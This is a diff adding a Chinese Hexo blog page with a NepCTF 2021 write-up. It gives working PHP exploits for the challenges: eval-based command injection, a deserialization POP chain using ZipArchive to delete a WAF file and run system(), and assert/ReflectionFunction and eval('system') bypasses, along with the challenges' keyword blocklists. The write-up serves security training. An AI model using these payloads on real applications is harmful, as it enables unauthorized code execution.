@@ -1,0 +1,1330 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  
+  <title itemprop="name">Nepctf | Pp1ove</title>
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
+  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
+  <link rel="stylesheet" id="saukra_css-css" href="/css/style.css" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/lib.min.css" media="all">
+  <link rel="stylesheet" href="/css/font.css" media="all">
+  <link rel="stylesheet" href="/css/insight.css" media="all">
+  <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="all">
+  <link rel="stylesheet" href="/css/zoom.css" media="all">
+  <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
+" type="text/css" media="all"> -->
+  <script>
+  /*Initial Variables*/
+  var mashiro_option = new Object();
+  var mashiro_global = new Object();
+  mashiro_option.NProgressON = true;
+  /* 
+   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
+   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
+   */
+  mashiro_option.email_domain = "";
+  mashiro_option.email_name = "";
+  mashiro_option.cookie_version_control = "";
+  mashiro_option.qzone_autocomplete = false;
+  mashiro_option.site_name = "さくら荘そのPp1ove";
+  mashiro_option.author_name = "Pp1ove";
+  mashiro_option.site_url = "https://pp1ove.github.io/";
+  mashiro_option.v_appId = "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz";
+  mashiro_option.v_appKey = "mgOpfzbkHYqU92CV4IDlAUHQ";
+  mashiro_option.mathjax = "0";
+  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
+  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";
+
+  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
+  // mashiro_option.float_player_on = true;
+
+  /*End of Initial Variables*/
+  </script>
+
+  <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn@latest/js/hititle.js"></script>
+  <script type="text/javascript">
+  var bg = "/img/cover/2.jpg,/img/cover/3.jpg,/img/cover/4.jpg,/img/cover/5.jpg,/img/cover/6.jpg,/img/cover/7.jpg,/img/cover/8.jpg,/img/cover/9.jpg,/img/cover/10.jpg".split(",");
+  var bgindex = Math.floor(Math.random()*bg.length);
+  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
+    alert('朋友，IE浏览器未适配哦~');
+  }
+  </script>
+  <style type="text/css">
+  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
+  </style>
+  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
+
+  </style>
+
+</head>
+</html>
+
+<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
+  <div class="scrollbar" id="bar">
+  </div>
+  <a href="#" class="cd-top faa-float animated"></a>
+  <section id="main-container">
+    <div class="headertop filter-dot">
+  <div id="banner_wave_1"></div>
+  <div id="banner_wave_2"></div>
+  <figure id="centerbg" class="centerbg">
+    <div class="focusinfo no-select">
+      <div class="header-tou">
+        <a href="https://pp1ove.github.io/">
+          <img src="/img/custom/head.jpg">
+        </a>
+      </div>
+      <div class="header-info">
+        <p>南风过境，十里春风不如你！</p>
+        <div class="top-social_v2">
+          <li id="bg-pre">
+            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+          
+            
+              
+                <li>
+                  <a href="http://github.com/Pp1ove" target="_blank" class="social-github" title="github">
+                    <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/social/github.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="https://space.bilibili.com/195675276" target="_blank" class="social-github" title="bilibili">
+                    <img src="/img/social/bilibili.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li class="wechat">
+                  <a href="/#">
+                    <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/social/wechat.png">
+                  </a>
+                  <div class="wechatInner">
+                    <img src="/img/custom/wechat.jpg">
+                  </div>
+                </li>
+              
+            
+              
+                <li class="wechat">
+                  <a href="/#">
+                    <img src="/img/social/qq.png">
+                  </a>
+                  <div class="wechatInner">
+                    <img src="/img/custom/qq.jpg">
+                  </div>
+                </li>
+              
+            
+          
+          <li id="bg-next">
+            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+        </div>
+      </div>
+    </div>
+  </figure>
+  <div id="video-container" style="">
+    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
+    </video>
+    <div id="video-btn" class="loadvideo videolive">
+    </div>
+    <div id="video-add">
+    </div>
+    <div class="video-stu">
+    </div>
+  </div>
+  <div class="headertop-down faa-float animated" onclick="headertop_down()">
+    <span>
+      <i class="fa fa-chevron-down" aria-hidden="true">
+      </i>
+    </span>
+  </div>
+</div>
+    <div id="page" class="site wrapper">
+      <header class="site-header no-select gizle sabit" role="banner">
+  <div class="site-top">
+    <div class="site-branding">
+      <span class="site-title">
+        <span class="logolink moe-mashiro">
+          <a href="/">
+            <span class="sakurasono">さくら荘その</span>
+            <span class="shironeko">Pp1ove</span>
+          </a>
+        </span>
+      </span>
+    </div>
+    <div class="searchbox search-form-submit">
+      <i class="iconfont js-toggle-search iconsearch icon-search">
+      </i>
+    </div>
+    <div id="show-nav" class="showNav mobile-fit">
+      <div class="line line1">
+      </div>
+      <div class="line line2">
+      </div>
+      <div class="line line3">
+      </div>
+    </div>
+    <div class="lower-cantiner">
+      <div class="lower">
+        <nav class="mobile-fit-control hide">
+          <ul id="menu-new" class="menu">
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+                    首页
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+                    归档
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/categories/技术/">
+                          <i class="fa fa-code" aria-hidden="true"></i>
+                          技术
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/复现/">
+                          <i class="fa fa-file-text-o" aria-hidden="true"></i>
+                          复现
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/学科/">
+                          <i class="fa fa-commenting-o" aria-hidden="true"></i>
+                          学科
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/题目/">
+                          <i class="fa fa-book" aria-hidden="true"></i>
+                          题目
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="javascript:;">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+                    清单
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/bangumi/">
+                          <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
+                          番组
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/music/">
+                          <i class="fa fa-headphones" aria-hidden="true"></i>
+                          歌单
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/tags/图集/">
+                          <i class="fa fa-photo" aria-hidden="true"></i>
+                          图集
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="/comment/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
+                    留言板
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/links/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
+                    友人帐
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/donate/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
+                    赞赏
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
+                    关于
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/about/">
+                          <i class="fa fa-meetup" aria-hidden="true"></i>
+                          我？
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="/client/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-android faa-vertical" aria-hidden="true"></i>
+                    客户端
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/atom.xml">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
+                    RSS
+                  </span>
+                </a>
+                
+              </li>
+            
+          </ul>
+        </nav>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+<div id="content" class="site-content">
+  <div id="primary" class="content-area">
+    <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+          <header class="entry-header">
+            <h1 class="entry-title">Nepctf</h1>
+            <p class="entry-census">Pp1ove&nbsp;·&nbsp;2021-3-22&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>
+
+            <hr>
+          </header>
+        
+        <div class="entry-content">
+          <p><strong>昵称:Pp1ove    比赛名次:151    分数 97</strong> </p>
+<h2 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h2><pre><code class="php">&lt;?php
+    error_reporting(0);
+    highlight_file(__FILE__);
+    $nep = $_GET[&#39;nep&#39;];
+    $len = $_GET[&#39;len&#39;];
+    if(intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13){
+        eval(substr($nep,0,$len));
+    }else{
+        die(&#39;too long!&#39;);
+    }
+?&gt;
+</code></pre>
+<pre><code>截取了$nep的长度,可以使用$nep=`$nep`;XXX
+$len=7
+这样截取后就会变成 eval(&quot;`$nep`;&quot;);
+$nep被解析,最终执行eval(``$nep`;XXX`);
+然后我们可以随意修改XXX的值来执行命令,
+但是这题对长度有限制,strlen($nep)&lt;13
+我们控制的XXX的长度就应该&lt;5
+执行命令ls&gt;a ,可以将ls的输出输入到a文件里面
+访问a文件,发现目录下有一个nepctf.php文件,
+再用xz *命令进行打包,*会列出当前目录下的所有文件,下载nepctf.php.xz获得flag
+</code></pre><h2 id="梦里花开牡丹亭"><a href="#梦里花开牡丹亭" class="headerlink" title="梦里花开牡丹亭"></a>梦里花开牡丹亭</h2><pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+error_reporting(0);
+include(&#39;shell.php&#39;);
+class Game{
+    public  $username;
+    public  $password;
+    public  $choice;
+    public  $register;
+
+    public  $file;
+    public  $filename;
+    public  $content;
+
+    public function __construct()
+    {
+        $this-&gt;username=&#39;user&#39;;
+        $this-&gt;password=&#39;user&#39;;
+    }
+
+    public function __wakeup(){
+        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;){
+            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);
+        }else{
+            $this-&gt;choice = new register();
+        }
+    }
+    public function __destruct() {
+        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);
+    }
+
+}
+class login{
+    public $file;
+    public $filename;
+    public $content;
+
+    public function __construct($file,$filename,$content)
+    {
+        $this-&gt;file=$file;
+        $this-&gt;filename=$filename;
+        $this-&gt;content=$content;
+    }
+    public function checking($username,$password)
+    {
+        if($username===&#39;admin&#39;&amp;&amp;$password===&#39;admin&#39;){
+            $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content);
+            die(&#39;login success you can to open shell file!&#39;);
+        }
+    }
+}
+class register{
+    public function checking($username,$password)
+    {
+        if($username===&#39;admin&#39;&amp;&amp;$password===&#39;admin&#39;){
+            die(&#39;success register admin&#39;);
+        }else{
+            die(&#39;please register admin &#39;);
+        }
+    }
+}
+class Open{
+    function open($filename, $content){
+        if(!file_get_contents(&#39;waf.txt&#39;)){
+            shell($content);
+        }else{
+            echo file_get_contents($filename.&quot;.php&quot;);
+        }
+    }
+}
+if($_GET[&#39;a&#39;]!==$_GET[&#39;b&#39;]&amp;&amp;(md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;])) &amp;&amp; (sha1($_GET[&#39;a&#39;])=== sha1($_GET[&#39;b&#39;]))){
+    @unserialize(base64_decode($_POST[&#39;unser&#39;]));
+}
+</code></pre>
+<p>简单的反序列化。。。。大概吧,一开始的pop链挺好构造的,</p>
+<pre><code class="php">class Game
+{
+    public $username;
+    public $password;
+    public $choice;
+    public $register;
+
+    public $file;
+    public $filename;
+    public $content;
+
+    public function __construct()
+    {
+        $this-&gt;username = &#39;admin&#39;;
+        $this-&gt;password = &#39;admin&#39;;
+        $this-&gt;register = &#39;admin&#39;;
+        $this-&gt;file = new Open();
+        $this-&gt;filename = &#39;shell&#39;;
+        $this-&gt;content = &#39;&#39;;
+    }
+
+    public function __wakeup()
+    {
+        if (md5($this-&gt;register) === &quot;21232f297a57a5a743894a0e4a801fc3&quot;) {
+            $this-&gt;choice = new login($this-&gt;file, $this-&gt;filename, $this-&gt;content);
+        }
+    }
+
+    public function __destruct()
+    {
+        $this-&gt;choice-&gt;checking($this-&gt;username, $this-&gt;password);
+    }
+
+}
+class login
+{
+}
+class register
+{
+}
+class Open
+{
+}
+$a = new Game();
+var_dump($a);
+echo base64_encode(serialize($a));
+</code></pre>
+<p>可以查看源代码读到shell.php文件,读php文件要看源代码!!!又给忘了,导致这里卡了半天没反应过来</p>
+<pre><code class="PHP">#shell.php
+function shell($cmd){
+    if(strlen($cmd)&lt;10){       if(preg_match(&#39;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#39;,$cmd)){
+            die(&quot;NO&quot;);
+        }else{
+            return system($cmd);
+        }
+    }else{
+        die(&#39;so long!&#39;);
+    }
+}
+</code></pre>
+<p>接下来就需要进入</p>
+<pre><code class="php">class Open{
+    function open($filename, $content){
+        if(!file_get_contents(&#39;waf.txt&#39;)){
+            echo $content;
+            shell($content);
+        }
+    }
+</code></pre>
+<p>但是waf.txt文件时存在的呀,而且参数不可控制,直接把人给打昏了,然后又尝试了下file_get_contents配合伪协议,发现也不行,好叭,倒回去看一下前面是否有利用点,还有个file参数,尝试一下利用,这里利用php的内置类</p>
+<p>,找一下又没有内置类里面有open方法</p>
+<pre><code class="php">&lt;?php
+$classes = get_declared_classes();
+foreach ($classes as $class) {
+    $methods = get_class_methods($class);
+    foreach ($methods as $method) {
+        if (in_array($method, array(&#39;open&#39;))) {
+            print $class . &#39;::&#39; . $method . &quot;\n&quot;;
+        }
+    }
+}
+#找到了三个
+SessionHandler::open
+ZipArchive::open
+XMLReader::open
+</code></pre>
+<p>去翻了一下官方文档,发现ZipArchive::open可以进行文件的overwrite,</p>
+<p>直接构造</p>
+<pre><code class="php">file=new ZipArchive();
+
+$this-&gt;filename = &#39;waf.txt&#39;;
+
+$this-&gt;content = 8; //echo了一下,ZipArchive::OVERWRITE=8
+</code></pre>
+<p>成功删除了waf.txt (这里之前我content没有设置为8,设置的1,可能因为没有关闭文件的原因,后面payload一直打不通,删除不了文件,重启了一下环境就好了)</p>
+<p>接下来就差最后一步了,执行命令</p>
+<pre><code class="bash">ls /   #发现根目录下的flag文件
+/flag&amp;&gt;q  #发现q文件创起了,但是里面没有内容,本地测试了一下,发现格式为flag={xxx}确实不会报错,自己也还没搞清楚报错的原因
+重新回到执行命令的思路上,对长度进行了限制,后面 空格/flag应该是固定的,就看前面的命令最多只有三个字符,n\l不就是三个字符吗?
+用$content=&#39;n\l /flag&#39;成功读取flag
+</code></pre>
+<p>最后附上exp</p>
+<pre><code class="php">&lt;?php
+class Game
+{
+    public $username;
+    public $password;
+    public $choice;
+    public $register;
+
+    public $file;
+    public $filename;
+    public $content;
+
+    public function __construct()
+    {
+        $this-&gt;username = &#39;admin&#39;;
+        $this-&gt;password = &#39;admin&#39;;
+        $this-&gt;register = &#39;admin&#39;;
+        $this-&gt;file = new Open();
+        $this-&gt;filename = &#39;&#39;;
+        $this-&gt;content = &#39;n\l /flag&#39;;
+    }
+
+    public function __wakeup()
+    {
+        if (md5($this-&gt;register) === &quot;21232f297a57a5a743894a0e4a801fc3&quot;) {
+            $this-&gt;choice = new login($this-&gt;file, $this-&gt;filename, $this-&gt;content);
+        }
+    }
+
+    public function __destruct()
+    {
+        $this-&gt;choice-&gt;checking($this-&gt;username, $this-&gt;password);
+    }
+
+}
+class login
+{
+}
+class register
+{
+}
+class Open
+{
+}
+$a = new Game();
+var_dump($a);
+echo base64_encode(serialize($a));
+</code></pre>
+<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="bbxhh"><a href="#bbxhh" class="headerlink" title="bbxhh"></a>bbxhh</h2><p>前面按着做就行了,因为封了ip需要不停换节点,然后主要弄下最后关键的代码(因为原题要不停换节点,就懒得弄了,直接把代码放到本地测试了)</p>
+<pre><code class="php">&lt;?php function waf($s)
+{
+    return preg_replace(&#39;/sys|exec|sh|flag|pass|file|open|dir|2333|;|#|\/\/|&gt;/i&#39;, &quot;NepnEpneP&quot;, $s);
+}
+
+if (isset($_GET[&#39;a&#39;])) {
+    $_ = waf($_GET[&#39;a&#39;]);
+    $__ = waf($_GET[&#39;b&#39;]);
+    $a = new $_($__);
+} else {
+    $a = new Error(&#39;?&#39;);
+}
+if (isset($_GET[&#39;c&#39;]) &amp;&amp; isset($_GET[&#39;d&#39;])) {
+    $c = waf($_GET[&#39;c&#39;]);
+    $d = waf($_GET[&#39;d&#39;]);
+    eval(&quot;\$a-&gt;$c($d);&quot;);
+} else {
+    $c = &quot;getMessage&quot;;
+    $d = &quot;&quot;;
+    eval(&quot;echo \$a-&gt;$c($d);&quot;);
+}
+</code></pre>
+<p>看wp说的需要用到反射类,那就去学学</p>
+<p><a href="https://learnku.com/articles/7538/the-application-of-reflection-in-php" target="_blank" rel="noopener">https://learnku.com/articles/7538/the-application-of-reflection-in-php</a></p>
+<p><a href="https://www.php.net/manual/zh/reflectionfunction.invokeargs.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/reflectionfunction.invokeargs.php</a></p>
+<p>exp:</p>
+<pre><code class="PHP">&lt;?php
+function waf($s){
+    return preg_replace(&#39;/sys|exec|sh|flag|pass|file|open|dir|2333|;|#|\/\/|&gt;/i&#39;, &quot;NepnEpneP&quot;, $s);
+}
+$a=&#39;ReflectionFunction&#39;;
+$b=&#39;assert&#39;;
+$c=&#39;invokeArgs&#39;;
+$d=&quot;array(&#39;show_source(\&quot;XXX.php\&quot;);&#39;)&quot;;
+
+if(isset($a))
+{
+    $_ = waf($a);
+    $__ = waf($b);
+    $a = new $_($__);
+}
+else
+{
+    $a = new Error(&#39;?&#39;);
+}
+if(isset($c) &amp;&amp; isset($d))
+{
+    $c = waf($c);
+    $d = waf($d);
+    eval(&quot;\$a-&gt;$c($d);&quot;);
+}
+else
+{
+    $c = &quot;getMessage&quot;;
+    $d = &quot;&quot;;
+    eval(&quot;echo \$a-&gt;$c($d);&quot;);
+}
+</code></pre>
+<p>然后遇到了一个大坑,就是我直接F10运行会疯狂报错,结果我在浏览器上查看的时候又没有问题。是因为我本地的php环境为7.3,而assert函数被舍弃了一些功能</p>
+<pre><code class="php">PHP &gt;= 5.4.8，description 可作为第四个参数提供给 ASSERT_CALLBACK 模式里的回调函数
+在 PHP 5 中，参数 assertion 必须是可执行的字符串，或者运行结果为布尔值的表达式
+在 PHP 7 中，参数 assertion 可以是任意表达式，并用其运算结果作为断言的依据
+在 PHP 7 中，参数 exception 可以是个 Throwable 对象，用于捕获表达式运行错误或断言结果为失败。(当然 assert.exception 需开启)
+PHP &gt;= 7.0.0，支持 zend.assertions、assert.exception 相关配置及其特性
+PHP &gt;= 7.2 版本开始，参数 assertion 不再支持字符串
+</code></pre>
+<p>还有另一种解法</p>
+<pre><code class="php">$c=&#39;getMessage&#39;;
+$d=&quot;eval(&#39;system(\&quot;dir\&quot;);&#39;)&quot;;
+</code></pre>
+<p>这里$a=new Error(‘?’);</p>
+<p>然后$c为$a下任意一个方法,当执行时,会先执行eval(‘system(\‘dir\‘);’);  system会自动回显输出,然后再将system();的返回值传给getMessage方法,然后报错,但是system已经执行了,所以说后面报不报错已经无所谓了。</p>
+<h2 id="gamejs"><a href="#gamejs" class="headerlink" title="gamejs"></a>gamejs</h2><p>访问source获得源码</p>
+<pre><code class="javascript">var opn = require(&#39;opn&#39;);
+var express = require(&#39;express&#39;);
+var app = express();
+var path = require(&#39;path&#39;);
+var bodyParser = require(&#39;body-parser&#39;);
+var highestScore = 40000;
+var FUNCFLAG = &#39;_$$ND_FUNC$$_&#39;;
+var serialize_banner = &#39;{&quot;banner&quot;:&quot;好，很有精神！&quot;}&#39;;
+var flag = {&quot;flag&quot;:&quot;&quot;} // flag是啥来着？记不清了。
+
+function Record() {
+    this.lastScore = 0;
+    this.maxScore = 0;
+    this.lastTime = null;
+}
+var validCode = function (func_code){
+    let validInput = /subprocess|mainModule|from|buffer|process|child_process|main|require|exec|this|eval|while|for|function|hex|char|base64|&quot;|&#39;|\[|\+|\*/ig;
+    return !validInput.test(func_code);
+};
+var validInput = function (input) {
+    let validInput = /subprocess|mainModule|from|process|child_process|main|require|exec|this|function|buffer/ig;
+    ins = serialize(input);
+    return !validInput.test(ins);
+};
+var merge = function (target, source) {
+    try {
+        for (let key in source) {
+            if (typeof source[key] == &#39;object&#39;) {
+                merge(target[key], source[key]);
+            } else {
+                target[key] = source[key];
+            }
+        }
+    }
+    catch (e) {
+        console.log(e);
+    }
+};
+var serialize = function (obj, ignoreNativeFunc, outputObj, cache, path) {
+    path = path || &#39;$&#39;;
+    cache = cache || {};
+    cache[path] = obj;
+    outputObj = outputObj || {};
+    if (typeof obj === &#39;string&#39;) {
+      return JSON.stringify(obj);
+    }
+    var key;
+    for (key in obj) {
+      if (obj.hasOwnProperty(key)) {
+        if (typeof obj[key] === &#39;function&#39;) {
+          var funcStr = obj[key].toString();
+          outputObj[key] = FUNCFLAG + funcStr;
+        } else {
+          outputObj[key] = obj[key];
+        }
+      }
+    }
+    return JSON.stringify(outputObj);
+};
+var unserialize = function(obj) {
+    obj = JSON.parse(obj);
+    if (typeof obj === &#39;string&#39;) {
+      return obj;
+    }
+    var key;
+    for(key in obj) {
+      if(typeof obj[key] === &#39;string&#39;) {
+        if(obj[key].indexOf(FUNCFLAG) === 0) {
+          var func_code=obj[key].substring(FUNCFLAG.length);
+          if (validCode(func_code)){
+            var d = &#39;(&#39; + func_code + &#39;)&#39;;
+            obj[key] = eval(d);
+          }
+        }
+      }
+    }
+    return obj;
+};
+app.use(bodyParser());
+app.use(bodyParser.json());
+app.use(express.static(path.join(__dirname, &#39;views&#39;)));
+
+app.use(function (req, res, next) {
+    if (validInput(req.body)) {
+        next();
+    } else {
+        res.status(403).send(&#39;Hacker!!!&#39;);
+    }
+});
+async function index(req, res) {
+    res.sendFile(path.resolve(__dirname, &#39;static/index.html&#39;));
+}
+async function record(req, res, next) {
+    new Promise(function (resolve, reject) {
+        var record = new Record();
+        var score = req.body.score;
+        if (score.length &lt; String(highestScore).length) {
+            merge(record, {
+                lastScore: score,
+                maxScore: Math.max(parseInt(score),record.maxScore),
+                lastTime: new Date().toString()
+            });
+            highestScore = highestScore &gt; parseInt(score) ? highestScore : parseInt(score);
+            if ((score - highestScore) &lt; 0) {
+                var banner = &quot;不好，没有精神！&quot;;
+            } else {
+                var banner = unserialize(serialize_banner).banner;
+            }
+        }
+        res.json({
+            banner: banner,
+            record: record
+        });
+    }).catch(function (err) {
+        next(err)
+    })
+}
+
+app.post(&#39;/record&#39;, record);
+app.get(&#39;/&#39;, index);
+app.get(&#39;/source&#39;, function (req, res) {
+    opn(&#39;app.js&#39;).then(() =&gt; {
+        res.sendFile(path.join(__dirname, &#39;app.js&#39;));
+    });
+})
+app.use(function (err, req, res, next) {
+    console.log(err.stack);
+    res.status(500).send(&#39;Some thing broke!&#39;)
+});
+app.listen(&#39;3000&#39;);
+</code></pre>
+
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="/img/custom/donate/zhifubaoSQ.jpg"></li>
+                <li class="wechat-code"><img src="/img/custom/donate/wechatSQ.jpg"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+        
+          
+            <div class="post-nepre full next">
+          
+            <a href="/2021/03/07/mysql提权/" rel="next">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                mysql提权</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz",
+        appKey: "mgOpfzbkHYqU92CV4IDlAUHQ",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
+
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+          <a href="hojun.cn" class="profile gravatar"><img src="https://wx1.sinaimg.cn/large/006bYVyvgy1ftand2qurdj303c03cdfv.jpg" itemprop="image" alt="Pp1ove" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="hojun.cn" itemprop="url" rel="author">Pp1ove</a>
+            </h3>
+          </div>
+        </div>
+        <hr>
+        <p><i class="iconfont icon-write"></i>一个好奇的人</p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
+</div>
+
+
+
+    </div>    
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            // PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+    
+<!-- <footer id="footer">
